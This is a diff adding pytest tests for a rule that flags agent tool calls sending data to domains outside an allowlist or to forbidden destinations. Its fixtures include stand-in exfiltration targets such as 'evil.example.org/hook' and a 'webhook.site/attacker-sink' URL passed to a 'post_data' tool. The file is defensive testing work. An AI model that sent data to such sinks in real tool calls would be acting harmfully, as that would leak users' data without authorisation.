@@ -100,3 +100,68 @@ def test_non_net_tier_is_ignored():
     }
 
     assert _rule().evaluate(trace) == []
+
+
+def test_embedded_url_in_prose_is_checked_against_allowlist():
+    trace = {
+        "spans": [
+            {
+                "span_id": "span-0",
+                "step_index": 0,
+                "span_type": "tool.call",
+                "name": "post_data",
+                "permission_tier": "net",
+                "input_parameters": {"note": "Forward payload to https://evil.example.org/hook"},
+            }
+        ]
+    }
+
+    violations = _rule().evaluate(trace)
+
+    assert len(violations) == 1
+    assert violations[0].evidence["reason"] == "domain_not_in_allowlist"
+    assert violations[0].evidence["domain"] == "evil.example.org"
+
+
+def test_bare_localhost_destination_is_blocked():
+    trace = {
+        "spans": [
+            {
+                "span_id": "span-0",
+                "step_index": 0,
+                "span_type": "tool.call",
+                "name": "post_data",
+                "permission_tier": "net",
+                "input_parameters": {"endpoint": "localhost:8080/collect"},
+            }
+        ]
+    }
+
+    violations = _rule().evaluate(trace)
+
+    assert len(violations) == 1
+    assert violations[0].evidence["reason"] == "domain_not_in_allowlist"
+    assert violations[0].evidence["domain"] == "localhost"
+
+
+def test_forbidden_pattern_takes_precedence_over_unallowed_domain():
+    trace = {
+        "spans": [
+            {
+                "span_id": "span-0",
+                "step_index": 0,
+                "span_type": "tool.call",
+                "name": "post_data",
+                "permission_tier": "net",
+                "input_parameters": {
+                    "url": "https://other.example.org/fallback",
+                    "webhook": "https://webhook.site/attacker-sink",
+                },
+            }
+        ]
+    }
+
+    violations = _rule().evaluate(trace)
+
+    assert len(violations) == 1
+    assert violations[0].evidence["reason"] == "forbidden_destination_pattern"
